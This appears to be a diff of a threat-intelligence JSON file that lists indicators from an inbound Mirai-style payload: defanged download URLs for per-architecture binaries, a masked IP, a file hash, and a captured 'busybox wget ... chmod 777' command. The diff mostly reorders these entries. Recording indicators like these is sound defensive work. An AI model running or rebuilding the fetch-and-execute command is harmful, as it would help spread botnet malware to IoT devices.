@@ -1,51 +1,9 @@
 [
   {
-    "context": "Embedded IP in inbound payload",
-    "source": "static_analysis",
-    "type": "ip",
-    "value": "141.11.88.XXX"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://141.11.88.XXX/bins/vcimanagement.arm;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://141.11.88.XXX/bins/vcimanagement.arm5;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://141.11.88.XXX/bins/vcimanagement.arm6;"
-  },
-  {
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
     "value": "hxxp://141.11.88.XXX/bins/vcimanagement.arm7;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://141.11.88.XXX/bins/vcimanagement.m68k;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://141.11.88.XXX/bins/vcimanagement.mips;"
-  },
-  {
-    "context": "Embedded URL in inbound payload",
-    "source": "strings",
-    "type": "url",
-    "value": "hxxp://141.11.88.XXX/bins/vcimanagement.mpsl;"
   },
   {
     "context": "Embedded URL in inbound payload",
@@ -63,13 +21,49 @@
     "context": "Embedded URL in inbound payload",
     "source": "strings",
     "type": "url",
+    "value": "hxxp://141.11.88.XXX/bins/vcimanagement.m68k;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://141.11.88.XXX/bins/vcimanagement.arm6;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://141.11.88.XXX/bins/vcimanagement.mips;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://141.11.88.XXX/bins/vcimanagement.arm5;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
     "value": "hxxp://141.11.88.XXX/bins/vcimanagement.spc;"
   },
   {
-    "context": "Inbound payload hash (mirai)",
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://141.11.88.XXX/bins/vcimanagement.mpsl;"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://141.11.88.XXX/bins/vcimanagement.arm;"
+  },
+  {
+    "context": "Embedded IP in inbound payload",
     "source": "static_analysis",
-    "type": "hash",
-    "value": "520891dcfb7fb57f823cbf033142f6b679ccdf611cb7a8b9a42c0e260ab1c6dc"
+    "type": "ip",
+    "value": "141.11.88.XXX"
   },
   {
     "context": "Suspicious command in inbound payload",
@@ -130,5 +124,11 @@
     "source": "strings",
     "type": "command",
     "value": "busybox wget hxxp://141.11.88.XXX/bins/vcimanagement.spc; chmod 777 vciman"
+  },
+  {
+    "context": "Inbound payload hash (mirai)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "520891dcfb7fb57f823cbf033142f6b679ccdf611cb7a8b9a42c0e260ab1c6dc"
   }
 ]
